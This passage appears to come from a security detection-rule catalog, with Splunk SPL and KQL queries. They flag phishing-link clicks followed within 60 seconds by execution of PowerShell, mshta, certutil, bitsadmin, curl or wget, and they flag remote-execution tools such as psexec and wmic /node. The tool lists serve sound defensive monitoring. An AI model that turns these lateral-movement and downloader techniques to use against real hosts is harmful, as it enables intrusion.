Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes

    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
